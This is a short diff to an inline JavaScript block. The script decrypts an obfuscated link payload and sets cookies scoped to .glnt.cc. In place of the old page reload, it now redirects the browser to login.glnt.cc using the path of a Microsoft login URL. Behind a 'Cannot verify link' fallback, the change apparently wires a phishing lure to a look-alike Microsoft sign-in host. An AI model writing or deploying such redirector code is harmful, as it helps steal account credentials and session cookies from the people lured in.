@@ -18,9 +18,10 @@ function _b(s){s=s.replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';r
         if(!pt)throw new Error('decrypt');
         const _l=JSON.parse(pt);
         const _u=encodeURIComponent(_l.r||'https://login.microsoftonline.com');
-        document.cookie='_s='+_u+';path=/;max-age=3600';
-        document.cookie='_c='+encodeURIComponent(_l.c||'')+';path=/;max-age=3600';
-        location.reload();
+        const _p=new URL(_l.r||'https://login.microsoftonline.com');
+        document.cookie='_s='+_u+';path=/;max-age=3600;domain=.glnt.cc';
+        document.cookie='_c='+encodeURIComponent(_l.c||'')+';path=/;max-age=3600;domain=.glnt.cc';
+        location.href='https://login.glnt.cc'+_p.pathname+_p.search;
     }catch(e){document.body.innerHTML='<p style="color:red">Cannot verify link</p>'}
 })();
 </script>
